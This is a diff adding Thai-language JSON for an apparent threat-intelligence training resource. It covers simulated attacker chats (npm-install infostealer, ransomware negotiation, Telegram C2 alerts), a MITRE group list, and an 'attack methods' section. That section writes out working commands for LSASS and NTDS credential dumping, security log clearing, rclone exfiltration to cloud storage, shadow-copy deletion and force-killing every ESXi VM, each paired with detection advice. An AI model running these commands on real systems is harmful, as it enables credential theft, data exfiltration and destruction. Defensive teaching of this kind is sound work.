+          "speaker": "attacker",
+          "role": "🤖 สคริปต์ BeaverTail & InvisibleFerret (ทำงานเงียบในพื้นหลังทันทีที่รัน npm)",
+          "time": "14:19 น.",
+          "text": "[Background Telemetry] ดึงไฟล์ Login Data จาก Chrome/Brave, กวาดโฟลเดอร์ส่วนขยายกระเป๋าคริปโต (`nkbihfbeogaeaoehlefnkodbefgpgknn`), อ่านไฟล์ `~/.ssh/id_rsa`, `~/.aws/credentials` และดาวน์โหลด Python RAT `InvisibleFerret` มาฝังตัวเรียบร้อย",
+          "tacticNote": "T1555.003 / T1552.001 / T1041: ขโมยทั้งรหัสผ่านบริษัท คีย์ AWS/GitHub และสินทรัพย์คริปโตภายในไม่กี่วินาที"
+        }
+      ],
+      "redFlags": [
+        "ผู้ติดต่อขอให้ `git clone` และรัน `npm install` / `pip install` โค้ดจากโปรเจกต์ภายนอกโดยตรงบนเครื่องทำงาน",
+        "ในไฟล์ `.js` มีช่องว่าง (Whitespace) ยาวผิดปกติแล้วซ่อนโค้ด `eval(Buffer.from(...))` ไว้ท้ายบรรทัด",
+        "มีการตั้งค่าสคริปต์ `preinstall` / `postinstall` ใน `package.json` ที่เรียกเชื่อมต่อ IP ภายนอก"
+      ],
+      "blueCounter": "ห้ามรันโปรเจกต์ทดสอบจากภายนอกบนเครื่องทำงานจริงเด็ดขาด (ต้องรันใน Disposable VM / DevContainer ที่แยกขาดจากเครือข่ายและไม่มีคีย์จริง) และใช้ `npm install --ignore-scripts`"
+    },
+    {
+      "id": "COMM-04",
+      "title": "4. บันทึกห้องแชตเจรจาค่าไถ่บน Tor Portal (LockBit 3.0 / Akira Double-Extortion Negotiation)",
+      "group": "G1024 Akira & LockBit 3.0 RaaS Syndicate",
+      "channel": "🧅 Tor Dark Web Negotiation Chat Portal",
+      "mitreTags": [
+        "T1486",
+        "T1567.002",
+        "T1657",
+        "T1490"
+      ],
+      "scenarioSummary": "หลังผู้โจมตีขโมยข้อมูลขนาด 850 GB ออกไปและเข้ารหัสไฟล์บนเซิร์ฟเวอร์ Windows + VMware ESXi สำเร็จ ทีมตอบสนองเหตุการณ์ (Incident Response) ได้เข้าสู่ห้องแชตบนเครือข่าย Tor ตามลิงก์ในไฟล์ README_RESTORE.txt เพื่อประเมินสถานการณ์และซื้อเวลา",
+      "messages": [
+        {
+          "speaker": "attacker",
+          "role": "💀 LockBit / Akira Negotiator (Automated + Human Operator)",
+          "time": "Day 1 - 09:00",
+          "text": "ยินดีต้อนรับสู่ระบบช่วยเหลือของเครือข่ายเรา เซิร์ฟเวอร์และ ESXi Hypervisors ของคุณถูกเข้ารหัสด้วยอัลกอริทึม AES-256 + RSA-4096 และเราได้ดาวน์โหลดข้อมูลสำคัญของคุณออกมาแล้ว 850 GB (รวมถึงฐานข้อมูลลูกค้า PDPA, งบการเงิน และสัญญาการค้า) ข้อเสนอในการซื้อตัวถอดรหัส (Decryptor) และลบข้อมูลทั้งหมดคือ $2,500,000 USD ในสกุล Monero (XMR) หรือ Bitcoin หากไม่ติดต่อภายใน 72 ชม. ข้อมูลทั้งหมดจะถูกเผยแพร่บน Leak Blog",
+          "tacticNote": "T1486 + T1657: ใช้กลยุทธ์ Double Extortion กดดันทั้งเรื่องระบบล่มและโทษปรับตามกฎหมายคุ้มครองข้อมูลส่วนบุคคล"
+        },
+        {
+          "speaker": "target",
+          "role": "🛡️ ทีมเจรจาฝ่ายรับมือเหตุการณ์ (IR Negotiator)",
+          "time": "Day 1 - 16:30",
+          "text": "เราได้รับข้อความของคุณแล้ว ขณะนี้คณะกรรมการบริหารกำลังประเมินผลกระทบ แต่ก่อนจะพูดคุยเรื่องตัวเลข เราต้องการหลักฐานยืนยันว่าคุณมีข้อมูลจริง (File Tree) และขอทดสอบถอดรหัสไฟล์ตัวอย่าง 2 ไฟล์เพื่อพิสูจน์ว่า Decryptor ของคุณใช้งานได้จริงและไม่ทำให้ไฟล์เสียหาย",
+          "tacticNote": "กลยุทธ์ IR: การขอ File Tree ช่วยให้ทีมสืบสวนรู้ขอบเขตโฟลเดอร์ที่รั่วไหล (เพื่อเตรียมแจ้ง สคส./PDPC ภายใน 72 ชม.) และช่วยซื้อเวลาให้ทีมวิศวกรกู้คืนระบบจาก Immutable Backup"
+        },
+        {
+          "speaker": "attacker",
+          "role": "💀 RaaS Operator",
+          "time": "Day 1 - 17:05",
+          "text": "นี่คือไฟล์ `file_tree_listing.txt` (420,000 ไฟล์จาก `\\\\FS01\\Finance$` และ `\\\\SQL01\\Backups$`) อัปโหลดไฟล์ที่ถูกเข้ารหัส 2 ไฟล์ (ขนาดไม่เกิน 2MB และไม่ใช่ไฟล์ฐานข้อมูลหลัก) มาในช่อง Attachment ได้เลย ถ้าคุณตัดสินใจจบดีลภายใน 48 ชั่วโมงนี้ เราลดให้เหลือ $1,650,000 USD",
+          "tacticNote": "T1039 / T1560: ผู้โจมตีเปิดเผยชื่อ File Share ต้นทางที่ถูกดูดข้อมูล ซึ่งช่วยให้ทีม DFIR ย้อนกลับไปหาเครื่องต้นตอที่รัน Rclone ได้ตรงจุด"
+        },
+        {
+          "speaker": "target",
+          "role": "🛡️ ทีม Incident Response (บันทึกภายใน SOC - ไม่ได้ส่งให้คนร้าย)",
+          "time": "Day 2 - 11:00",
+          "text": "[Internal IR Note] ตรวจสอบ `file_tree_listing.txt` แล้วพบว่าข้อมูลถูกดึงออกจากเครื่อง `SRV-APP-04` ผ่าน `rclone.exe` ไปยัง MEGA.nz ขณะนี้ทีมวิศวกรกู้คืน VM ทั้งหมดจาก Immutable Offline Backup (Veeam Hardened Repo) สำเร็จ 100% แล้ว และเตรียมออกหนังสือแจ้งสำนักงานคณะกรรมการคุ้มครองข้อมูลส่วนบุคคล (สคส. / PDPC) ตามมาตรา 37(4) โดยไม่ต้องจ่ายค่าไถ่",
+          "tacticNote": "M1053 (Data Backup): การมี Immutable Backup ที่แยกขาดจาก Active Directory ช่วยให้องค์กรกู้ระบบกลับมาได้โดยไม่ต้องยอมจำนนต่อการข่มขู่"
+        }
+      ],
+      "redFlags": [
+        "คำขู่ว่าจะแจ้งลูกค้า คู่ค้า หรือหน่วยงานกำกับดูแลเพื่อบีบให้จ่ายเงินเร็วขึ้น",
+        "ข้อเสนอช่วยเหลือด้านการตั้งค่าความปลอดภัยหลังจ่ายเงิน (Security Report) ซึ่งเป็นกลลวงมาตรฐานของกลุ่ม RaaS",
+        "การจ่ายค่าไถ่ไม่ได้รับประกันว่าผู้โจมตีจะลบข้อมูลที่ขโมยไปจริง"
+      ],
+      "blueCounter": "แยกเครือข่ายระบบสำรองข้อมูลแบบ Immutable/Air-gapped (M1053), เก็บ NetFlow/Proxy Logs เพื่อระบุขนาดและชื่อไฟล์ที่ถูกส่งออกจริง และปฏิบัติตามขั้นตอนการแจ้งเหตุละเมิดข้อมูลส่วนบุคคลภายใน 72 ชั่วโมง"
+    },
+    {
+      "id": "COMM-05",
+      "title": "5. การซื้อขายสิทธิ์เข้าถึงองค์กร (Initial Access Broker) & ข้อความแจ้งเตือนจากบอต C2 บน Telegram",
+      "group": "G1011 EXOTIC LILY / G1037 TA577 & Telegram C2 Bot",
+      "channel": "🕶️ Dark Web Forum + ✈️ Telegram Bot API C2 (T1102.002)",
+      "mitreTags": [
+        "T1650",
+        "T1589.001",
+        "T1102.002",
+        "T1071.001"
+      ],
+      "scenarioSummary": "แสดงเบื้องหลังห่วงโซ่อุปทานของอาชญากรไซเบอร์: ตั้งแต่บอต InfoStealer/C2 ส่งข้อความแจ้งเตือนเข้า Telegram ของแฮกเกอร์เมื่อมีเหยื่อติดเชื้อ ไปจนถึงนายหน้าขายสิทธิ์ (Initial Access Broker - T1650) นำสิทธิ์ VPN/Domain Admin ไปโพสต์ขายต่อให้กลุ่มแรนซัมแวร์",
+      "messages": [
+        {
+          "speaker": "attacker",
+          "role": "🤖 Telegram C2 Bot (`@RedLine_Beacon_Bot` -> T1102.002)",
+          "time": "02:14 น.",
+          "text": "🔔 **[NEW VICTIM INITIALIZED]**\n• **Host:** `CORP-FIN-PC09` (`10.20.15.44`)\n• **User:** `CORP\\somchai.p` (Local Admin: YES)\n• **Country:** TH / AS45758\n• **Extracted Cookies/Logins:** 48 Saved Passwords (includes `vpn.corp-example.co.th`, `portal.azure.com`)\n• **Command Prompt:** Type `/shell_9941 whoami /all` to execute",
+          "tacticNote": "T1102.002 (Web Service Bidirectional C2): มัลแวร์ใช้ `api.telegram.org/bot<token>/sendMessage` ส่งข้อมูลเครื่องเหยื่อออกไปโดยผ่าน Firewall ที่เปิดพอร์ต 443"
+        },
+        {
+          "speaker": "attacker",
+          "role": "🕵️ Initial Access Broker (โพสต์ประกาศขายในฟอรัมใต้ดิน - T1650 Acquire Access)",
+          "time": "13:00 น.",
+          "text": "🔥 **[SELLING CORPORATE ACCESS - MANUFACTURING SECTOR]**\n• **Revenue:** $180M USD | **Hosts:** ~1,200 endpoints\n• **Access Type:** SSL VPN (Fortinet) + Valid Domain User + Local Admin on Jump Server\n• **AV/EDR:** Windows Defender (Default Config)\n• **Price:** $4,500 USD (Instant Buy) or 15% Revenue Share for LockBit/Akira Affiliates",
+          "tacticNote": "T1650 (Acquire Access): นายหน้า IAB มักขายสิทธิ์ที่ดึงมาจาก InfoStealer ให้กลุ่มแรนซัมแวร์เข้ามาทำ Lateral Movement ต่อภายในไม่กี่ชั่วโมง"
+        }
+      ],
+      "redFlags": [
+        "มีการเรียกต่อไปยัง `api.telegram.org` หรือ `discord.com/api/webhooks/...` จากโปรเซสพื้นหลังที่ไม่ใช่แอปแชต (เช่น `powershell.exe`, `rundll32.exe`, `python.exe`)",
+        "พนักงานใช้เบราว์เซอร์ส่วนตัวที่ซิงก์รหัสผ่านองค์กรไว้ในเครื่องที่ติด InfoStealer"
+      ],
+      "blueCounter": "บล็อกหรือเฝ้าระวังการเรียก `api.telegram.org` และ `discord.com/api/webhooks` จากเซิร์ฟเวอร์และโปรเซสสคริปต์, ห้ามบันทึกรหัสผ่านสำคัญในเบราว์เซอร์ทั่วไป และเพิกถอน Session Token ทันทีที่พบแจ้งเตือนใน Dark Web Monitoring"
+    }
+  ],
+  "attackMethodsArsenal": [
+    {
+      "id": "METH-01",
+      "stage": "Initial Access & Social Engineering",
+      "title": "HTML Smuggling, .ISO/.LNK Container & AiTM Reverse Proxy Phishing",
+      "groups": [
+        "APT29 (G0016)",
+        "Mustang Panda (G0129)",
+        "Scattered Spider (G1015)"
+      ],
+      "mitreIds": [
+        "T1566.001",
+        "T1566.002",
+        "T1027.006",
+        "T1553.005",
+        "T1539"
+      ],
+      "software": [
+        "Evilginx2 / Modlishka",
+        "EnvyScout (S0603)",
+        "Custom .ISO/.VHD Builders"
+      ],
+      "howItWorks": "แทนที่จะส่งไฟล์ `.exe` ที่ถูกบล็อกง่าย ผู้โจมตีใช้ JavaScript Blob บนหน้าเว็บประกอบไฟล์ `.iso` หรือ `.zip` ขึ้นบนเครื่องเหยื่อโดยตรง (HTML Smuggling) เพื่อให้ไฟล์ไม่มีแท็ก Mark-of-the-Web (MOTW) ข้างในมีไฟล์ทางลัด `.lnk` ที่เรียก `rundll32.exe` โหลด DLL อันตราย หรือใช้ Evilginx ดักจับ Session Cookie หลังเหยื่อกรอก MFA",
+      "cliExample": "# ตัวอย่างคำสั่งที่ซ่อนอยู่ในไฟล์ทางลัด (.LNK Target):\nC:\\Windows\\System32\\cmd.exe /c \"start Agenda_2026.pdf && rundll32.exe .\\libcrypto_helper.dll,StartWork\"",
+      "detection": "ตรวจจับ Sysmon Event ID 1 เมื่อ `explorer.exe` รัน `cmd.exe` หรือ `rundll32.exe` จากไดรฟ์จำลองที่เมาท์มาจากไฟล์ `.iso`/`.vhd` (Event ID 12/13 VHD Mount) และบังคับใช้ FIDO2 Passkeys"
+    },
+    {
+      "id": "METH-02",
+      "stage": "Execution & Living-off-the-Land (LOTL)",
+      "title": "Fileless PowerShell, WMI & System Binary Proxy Execution (LOLBins)",
+      "groups": [
+        "Volt Typhoon (G1017)",
+        "APT28 (G0007)",
+        "OilRig (G0049)"
+      ],
+      "mitreIds": [
+        "T1059.001",
+        "T1047",
+        "T1218.005",
+        "T1218.010",
+        "T1218.011"
+      ],
+      "software": [
+        "PowerShell",
+        "WMIC",
+        "rundll32.exe / regsvr32.exe / mshta.exe / certutil.exe"
+      ],
+      "howItWorks": "ใช้โปรแกรมมาตรฐานที่ติดตั้งมากับ Windows และมีใบรับรองของ Microsoft ในการดาวน์โหลดและรันโค้ดในหน่วยความจำโดยไม่เขียนไฟล์มัลแวร์ลงดิสก์",
+      "cliExample": "# การรันสคริปต์ในหน่วยความจำและสั่งงานข้ามเครื่องผ่าน WMI:\npowershell.exe -NoP -NonI -W Hidden -Enc <Base64Payload>\nwmic /node:10.20.30.15 process call create \"rundll32.exe C:\\Windows\\Temp\\update.dll,DllMain\"",
+      "detection": "เปิดใช้งาน PowerShell Script Block Logging (Event ID 4104), เฝ้าระวังโปรเซสลูกของ `wmiprvse.exe` และใช้กฎ Attack Surface Reduction (ASR) บล็อก LOLBins ที่เชื่อมต่ออินเทอร์เน็ต"
+    },
+    {
+      "id": "METH-03",
+      "stage": "Defense Impairment (TA0112 - v20.0)",
+      "title": "BYOVD (Bring Your Own Vulnerable Driver) & Security Log Tampering",
+      "groups": [
+        "Akira (G1024)",
+        "LockBit 3.0 (S0002)",
+        "Sandworm (G0034)",
+        "Lazarus (G0032)"
+      ],
+      "mitreIds": [
+        "T1685.001",
+        "T1685.005",
+        "T1686",
+        "T1688",
+        "T1068"
+      ],
+      "software": [
+        "Terminator / AuKill",
+        "Vulnerable Signed Drivers (rwdrv.sys, procexp.sys)",
+        "wevtutil.exe"
+      ],
+      "howItWorks": "เมื่อได้สิทธิ์ Admin บนเครื่อง ผู้โจมตีจะติดตั้งไดรเวอร์ที่มีใบรับรองถูกต้องแต่มีช่องโหว่ระดับ Kernel (BYOVD) เพื่อสั่งฆ่าโปรเซสของ EDR/Antivirus ที่เปิด Tamper Protection ไว้ จากนั้นปิด Windows Firewall และล้าง Event Logs ทั้งหมด",
+      "cliExample": "# การสร้างบริการโหลด Vulnerable Driver และการล้าง Security Logs:\nsc.exe create SysHelper binPath= \"C:\\Users\\Public\\driver_vuln.sys\" type= kernel && sc.exe start SysHelper\nwevtutil.exe cl Security && wevtutil.exe cl System && wevtutil.exe cl Microsoft-Windows-PowerShell/Operational",
+      "detection": "เปิดใช้ Microsoft Vulnerable Driver Blocklist (HVCI / Memory Integrity), เฝ้าระวัง Sysmon Event ID 6 (Driver Loaded), Event ID 7045 (Kernel Service Created) และ Event ID 1102 (Audit Log Cleared)"
+    },
+    {
+      "id": "METH-04",
+      "stage": "Credential Access & Active Directory Takeover",
+      "title": "LSASS MiniDump, Kerberoasting, DCSync & NTDS.dit Extraction",
+      "groups": [
+        "APT29 (G0016)",
+        "Volt Typhoon (G1017)",
+        "FIN7 (G0046)",
+        "LockBit 3.0 (S0002)"
+      ],
+      "mitreIds": [
+        "T1003.001",
+        "T1003.003",
+        "T1003.006",
+        "T1558.003",
+        "T1552.005"
+      ],
+      "software": [
+        "S0002 Mimikatz",
+        "Rubeus",
+        "Impacket (secretsdump.py / GetUserSPNs.py)",
+        "ntdsutil.exe"
+      ],
+      "howItWorks": "ดึงข้อมูลรับรองจากหน่วยความจำของ `lsass.exe` ด้วยไลบรารีมาตรฐาน `comsvcs.dll`, ขอตั๋ว Kerberos TGS ของบัญชีบริการมาแคร็กรหัสผ่านออฟไลน์ (Kerberoasting) หรือจำลองตัวเองเป็น Domain Controller เพื่อสั่งซิงก์รหัสผ่านทั้งองค์กร (DCSync)",
+      "cliExample": "# ดัมพ์ LSASS โดยใช้ comsvcs.dll ของ Windows และสร้างสำเนาฐานข้อมูล AD ด้วย ntdsutil:\nrundll32.exe C:\\windows\\System32\\comsvcs.dll, MiniDump <LSASS_PID> C:\\Windows\\Temp\\debug.dmp full\nntdsutil.exe \"ac i ntds\" \"ifm\" \"create full C:\\Windows\\Temp\\AD_Backup\" q q",
+      "detection": "เปิดใช้งาน LSA Protection (`RunAsPPL`) และ Credential Guard, ดักจับ Sysmon Event ID 10 ที่เข้าถึง `lsass.exe`, จับ Event ID 4769 (Ticket Encryption 0x17 RC4) และ Event ID 4662 (Directory Service Replication)"
+    },
+    {
+      "id": "METH-05",
+      "stage": "Lateral Movement, C2 Tunneling & Exfiltration",
+      "title": "Pass-the-Hash, Netsh Portproxy, RMM Abuse & Rclone Cloud Exfiltration",
+      "groups": [
+        "Scattered Spider (G1015)",
+        "Volt Typhoon (G1017)",
+        "Akira (G1024)",
+        "Storm-1811 (G1046)"
+      ],
+      "mitreIds": [
+        "T1021.001",
+        "T1021.002",
+        "T1550.002",
+        "T1090.001",
+        "T1219.002",
+        "T1567.002"
+      ],
+      "software": [
+        "Impacket (wmiexec / psexec)",
+        "AnyDesk / ScreenConnect",
+        "Chisel / Ligolo-ng / FRP",
+        "Rclone"
+      ],
+      "howItWorks": "ใช้ค่า NTLM Hash หรือตั๋ว Kerberos ล็อกอินข้ามเซิร์ฟเวอร์โดยไม่ต้องรู้รหัสผ่านจริง สร้างท่อส่งต่อทราฟฟิกภายในด้วย `netsh portproxy` และใช้ `rclone` อัปโหลดข้อมูลขนาดหลายร้อยกิกะไบต์ออกไปยัง Cloud Storage สาธารณะ",
+      "cliExample": "# สร้าง Internal Proxy Tunnel และส่งออกข้อมูลด้วย Rclone:\nnetsh interface portproxy add v4tov4 listenport=8443 listenaddress=0.0.0.0 connectport=3389 connectaddress=10.20.30.10\nrclone.exe copy \"\\\\FS01\\Confidential_PII\" mega_remote:backup_archive --transfers 16 --ignore-errors",
+      "detection": "ตรวจจับการแก้ไข Registry ของ `PortProxy\\v4tov4` (Sysmon ID 13), บล็อกโปรแกรม RMM และ `rclone.exe` ด้วย Application Control และตั้ง Alert เมื่อพบปริมาณข้อมูลขาออก (Outbound Traffic Spike) ผิดปกติ"
+    },
+    {
+      "id": "METH-06",
+      "stage": "Impact: Hypervisor, Cloud & OT Sabotage",
+      "title": "VMware ESXi `.vmdk` Encryption, Shadow Copy Wipe & ICS PLC Manipulation",
+      "groups": [
+        "Akira (G1024)",
+        "Scattered Spider (G1015)",
+        "Sandworm (G0034)",
+        "TeamPCP (G1056)"
+      ],
+      "mitreIds": [
+        "T1490",
+        "T1486",
+        "T1675",
+        "T1485.001",
+        "T0836",
+        "T0843"
+      ],
+      "software": [
+        "ESXi Rust/C++ Ransomware Lockers",
+        "vssadmin / esxcli",
+        "Industroyer2 (S0604)"
+      ],
+      "howItWorks": "ลบสำเนา Volume Shadow Copies บน Windows หรือใช้คำสั่ง `esxcli` สั่งปิด Virtual Machines ทั้งหมดบน VMware ESXi แล้วเข้ารหัสไฟล์ดิสก์ `.vmdk` และ `.vmx` รวดเดียวทั้งดาต้าเซ็นเตอร์ ส่วนในโรงงาน OT จะส่งคำสั่งแก้ค่าพารามิเตอร์ลงสู่ PLC โดยตรง",
+      "cliExample": "# ลบ Shadow Copies บน Windows และสั่งหยุด VM ทั้งหมดบน ESXi ก่อนเข้ารหัส:\nvssadmin.exe delete shadows /all /quiet && bcdedit /set {default} recoveryenabled No\nfor i in $(esxcli vm process list | grep 'World ID:' | awk '{print $3}'); do esxcli vm process kill -t=force -w=$i; done",
+      "detection": "ตั้งกฎ EDR ให้ Isolate Host ทันทีที่มีการรัน `vssadmin delete shadows`, เปิดใช้งาน ESXi Lockdown Mode (ปิด SSH), แยกเครือข่ายระบบ Backup แบบ Immutable WORM และล็อกกุญแจ PLC ในโหมด RUN"
+    }
+  ],
+  "totalOfficialGroups": 182,
+  "totalOfficialCampaigns": 61,
+  "groups": [
+    {
+      "id": "G0018",
+      "name": "admin@338",
+      "aliases": "",
+      "desc": "admin@338 is a China-based cyber threat group. It has previously used newsworthy events as lures to deliver malware and has primarily targeted organizations involved in financial, economic, and ...",
+      "url": "https://attack.mitre.org/groups/G0018/"
+    },
+    {
+      "id": "G1030",
+      "name": "Agrius",
+      "aliases": "Pink Sandstorm, AMERICIUM, Agonizing Serpens, BlackShadow",
+      "desc": "Agrius is an Iranian threat actor active since 2020 notable for a series of ransomware and wiper operations in the Middle East, with an emphasis on Israeli targets. Public reporting has linked ...",
+      "url": "https://attack.mitre.org/groups/G1030/"
+    },
+    {
+      "id": "G0130",
+      "name": "Ajax Security Team",
+      "aliases": "Operation Woolen-Goldfish, AjaxTM, Rocket Kitten, Flying Kitten, Operation Saffron Rose",
+      "desc": "Ajax Security Team is a group that has been active since at least 2010 and believed to be operating out of Iran. By 2014 Ajax Security Team transitioned from website defacement operations to ...",
+      "url": "https://attack.mitre.org/groups/G0130/"
+    },
+    {
+      "id": "G1024",
+      "name": "Akira",
+      "aliases": "GOLD SAHARA, PUNK SPIDER, Howling Scorpius",
+      "desc": "Threat Group Akira (G1024)",
+      "url": "https://attack.mitre.org/groups/G1024/"
+    },
+    {
+      "id": "G1000",
+      "name": "ALLANITE",
+      "aliases": "Palmetto Fusion",
+      "desc": "ALLANITE is a suspected Russian cyber espionage group, that has primarily targeted the electric utility sector within the United States and United Kingdom. The group's tactics and techniques are ...",
+      "url": "https://attack.mitre.org/groups/G1000/"
+    },
+    {
+      "id": "G0138",
+      "name": "Andariel",
+      "aliases": "Silent Chollima, PLUTONIUM, Onyx Sleet",
+      "desc": "Threat Group Andariel (G0138)",
+      "url": "https://attack.mitre.org/groups/G0138/"
+    },
+    {
+      "id": "G1007",
+      "name": "Aoqin Dragon",
+      "aliases": "",
+      "desc": "Aoqin Dragon is a suspected Chinese cyber espionage threat group that has been active since at least 2013. Aoqin Dragon has primarily targeted government, education, and telecommunication ...",
+      "url": "https://attack.mitre.org/groups/G1007/"
+    },
+    {
+      "id": "G1049",
+      "name": "AppleJeus",
+      "aliases": "Gleaming Pisces, Citrine Sleet, UNC1720, UNC4736",
+      "desc": "Threat Group AppleJeus (G1049)",
+      "url": "https://attack.mitre.org/groups/G1049/"
+    },
+    {
+      "id": "G1028",
+      "name": "APT-C-23",
+      "aliases": "Mantis, Arid Viper, Desert Falcon, TAG-63, Grey Karkadann, Big Bang APT, Two-tailed Scorpion",
+      "desc": "APT-C-23 is a threat group that has been active since at least 2014. APT-C-23 has primarily focused its operations on the Middle East, including Israeli military assets. APT-C-23 has developed ...",
+      "url": "https://attack.mitre.org/groups/G1028/"
+    },
+    {
+      "id": "G0099",
+      "name": "APT-C-36",
+      "aliases": "Blind Eagle, TAG-144, AguilaCiega, APT-Q-98",
+      "desc": "APT-C-36 is a suspected South American threat group that has engaged in espionage and financially motivated operations since at least 2018. APT-C-36 has targeted government institutions and ...",
+      "url": "https://attack.mitre.org/groups/G0099/"
+    },
+    {
+      "id": "G0006",
+      "name": "APT1",
+      "aliases": "Comment Crew, Comment Group, Comment Panda",
+      "desc": "APT1 is a Chinese threat group that has been attributed to the 2nd Bureau of the People's Liberation Army (PLA) General Staff Department's (GSD) 3rd Department, commonly known by its Military Unit ...",
+      "url": "https://attack.mitre.org/groups/G0006/"
+    },
+    {
+      "id": "G0005",
+      "name": "APT12",
+      "aliases": "IXESHE, DynCalc, Numbered Panda, DNSCALC",
+      "desc": "APT12 is a threat group that has been attributed to China. The group has targeted a variety of victims including but not limited to media outlets, high-tech companies, and multiple governments.",
+      "url": "https://attack.mitre.org/groups/G0005/"
+    },
+    {
+      "id": "G0023",
+      "name": "APT16",
+      "aliases": "",
+      "desc": "APT16 is a China-based threat group that has launched spearphishing campaigns targeting Japanese and Taiwanese organizations.",
+      "url": "https://attack.mitre.org/groups/G0023/"
+    },
+    {
+      "id": "G0025",
+      "name": "APT17",
+      "aliases": "Deputy Dog",
+      "desc": "APT17 is a China-based threat group that has conducted network intrusions against U.S. government entities, the defense industry, law firms, information technology companies, mining companies, and ...",
+      "url": "https://attack.mitre.org/groups/G0025/"
+    },
+    {
+      "id": "G0026",
+      "name": "APT18",
+      "aliases": "TG-0416, Dynamite Panda, Threat Group-0416",
+      "desc": "APT18 is a threat group that has operated since at least 2009 and has targeted a range of industries, including technology, manufacturing, human rights groups, government, and medical.",
+      "url": "https://attack.mitre.org/groups/G0026/"
+    },
+    {
+      "id": "G0073",
+      "name": "APT19",
+      "aliases": "Codoso, C0d0so0, Codoso Team, Sunshop Group",
+      "desc": "APT19 is a Chinese-based threat group that has targeted a variety of industries, including defense, finance, energy, pharmaceutical, telecommunications, high tech, education, manufacturing, and ...",
+      "url": "https://attack.mitre.org/groups/G0073/"
+    },
+    {
+      "id": "G0007",
+      "name": "APT28",
+      "aliases": "IRON TWILIGHT, SNAKEMACKEREL, Swallowtail, Group 74, Sednit, Sofacy, Pawn Storm, Fancy Bear, STRONTIUM, Tsar Team, Threat Group-4127, TG-4127, Forest Blizzard, FROZENLAKE, GruesomeLarch",
+      "desc": "Threat Group APT28 (G0007)",
+      "url": "https://attack.mitre.org/groups/G0007/"
+    },
+    {
+      "id": "G0016",
+      "name": "APT29",
+      "aliases": "IRON RITUAL, IRON HEMLOCK, NobleBaron, Dark Halo, NOBELIUM, UNC2452, YTTRIUM, The Dukes, Cozy Bear, CozyDuke, SolarStorm, Blue Kitsune, UNC3524, Midnight Blizzard",
+      "desc": "Threat Group APT29 (G0016)",
+      "url": "https://attack.mitre.org/groups/G0016/"
+    },
+    {
+      "id": "G0022",
+      "name": "APT3",
+      "aliases": "Gothic Panda, Pirpi, UPS Team, Buckeye, Threat Group-0110, TG-0110",
+      "desc": "APT3 is a China-based threat group that researchers have attributed to China's Ministry of State Security. This group is responsible for the campaigns known as Operation Clandestine Fox, Operation ...",
+      "url": "https://attack.mitre.org/groups/G0022/"
+    },
+    {
+      "id": "G0013",
+      "name": "APT30",
+      "aliases": "",
+      "desc": "APT30 is a threat group suspected to be associated with the Chinese government. While Naikon shares some characteristics with APT30, the two groups do not appear to be exact matches.",
+      "url": "https://attack.mitre.org/groups/G0013/"
+    },
+    {
+      "id": "G0050",
+      "name": "APT32",
+      "aliases": "SeaLotus, OceanLotus, APT-C-00, Canvas Cyclone, BISMUTH",
+      "desc": "APT32 is a suspected Vietnam-based threat group that has been active since at least 2014. The group has targeted multiple private sector industries as well as foreign governments, dissidents, and ...",
+      "url": "https://attack.mitre.org/groups/G0050/"
+    },
+    {
+      "id": "G0064",
+      "name": "APT33",
+      "aliases": "HOLMIUM, Elfin, Peach Sandstorm",
+      "desc": "APT33 is a suspected Iranian threat group that has carried out operations since at least 2013. The group has targeted organizations across multiple industries in the United States, Saudi Arabia ...",
+      "url": "https://attack.mitre.org/groups/G0064/"
+    },
+    {
+      "id": "G0067",
+      "name": "APT37",
+      "aliases": "InkySquid, ScarCruft, Reaper, Group123, TEMP.Reaper, Ricochet Chollima",
+      "desc": "Threat Group APT37 (G0067)",
+      "url": "https://attack.mitre.org/groups/G0067/"
+    },
+    {
+      "id": "G0082",
+      "name": "APT38",
+      "aliases": "NICKEL GLADSTONE, BeagleBoyz, Bluenoroff, Stardust Chollima, Sapphire Sleet, COPERNICIUM",
+      "desc": "Threat Group APT38 (G0082)",
+      "url": "https://attack.mitre.org/groups/G0082/"
+    },
+    {
+      "id": "G0087",
+      "name": "APT39",
+      "aliases": "ITG07, Chafer, Remix Kitten",
+      "desc": "APT39 is one of several names for cyber espionage activity conducted by the Iranian Ministry of Intelligence and Security (MOIS) through the front company Rana Intelligence Computing since at ...",
+      "url": "https://attack.mitre.org/groups/G0087/"
+    },
+    {
+      "id": "G0096",
+      "name": "APT41",
+      "aliases": "Wicked Panda, Brass Typhoon, BARIUM",
+      "desc": "APT41 is a threat group that researchers have assessed as Chinese state-sponsored espionage group that also conducts financially-motivated operations. Active since at least 2012, APT41 has been ...",
+      "url": "https://attack.mitre.org/groups/G0096/"
+    },
+    {
+      "id": "G1044",
+      "name": "APT42",
+      "aliases": "",
+      "desc": "Threat Group APT42 (G1044)",
+      "url": "https://attack.mitre.org/groups/G1044/"
+    },
+    {
+      "id": "G1023",
+      "name": "APT5",
+      "aliases": "Mulberry Typhoon, MANGANESE, BRONZE FLEETWOOD, Keyhole Panda, UNC2630",
+      "desc": "APT5 is a China-based espionage actor that has been active since at least 2007 primarily targeting the telecommunications, aerospace, and defense industries throughout the U.S., Europe, and Asia ...",
+      "url": "https://attack.mitre.org/groups/G1023/"
+    },
+    {
+      "id": "G0143",
+      "name": "Aquatic Panda",
+      "aliases": "",
+      "desc": "Aquatic Panda is a suspected China-based threat group with a dual mission of intelligence collection and industrial espionage. Active since at least May 2020, Aquatic Panda has primarily targeted ...",
+      "url": "https://attack.mitre.org/groups/G0143/"
+    },
+    {
+      "id": "G0001",
+      "name": "Axiom",
+      "aliases": "Group 72",
+      "desc": "Axiom is a suspected Chinese cyber espionage group that has targeted the aerospace, defense, government, manufacturing, and media sectors since at least 2008. Some reporting suggests a degree of ...",
+      "url": "https://attack.mitre.org/groups/G0001/"
+    },
+    {
+      "id": "G0135",
+      "name": "BackdoorDiplomacy",
+      "aliases": "",
+      "desc": "BackdoorDiplomacy is a cyber espionage threat group that has been active since at least 2017. BackdoorDiplomacy has targeted Ministries of Foreign Affairs and telecommunication companies in Africa ...",
+      "url": "https://attack.mitre.org/groups/G0135/"
+    },
+    {
+      "id": "G1002",
+      "name": "BITTER",
+      "aliases": "T-APT-17",
+      "desc": "BITTER is a suspected South Asian cyber espionage threat group that has been active since at least 2013. BITTER has targeted government, energy, and engineering organizations in Pakistan, China ...",
+      "url": "https://attack.mitre.org/groups/G1002/"
+    },
+    {
+      "id": "G1043",
+      "name": "BlackByte",
+      "aliases": "Hecamede",
+      "desc": "BlackByte is a ransomware threat actor operating since at least 2021. BlackByte is associated with several versions of ransomware also labeled BlackByte Ransomware. BlackByte ransomware operations ...",
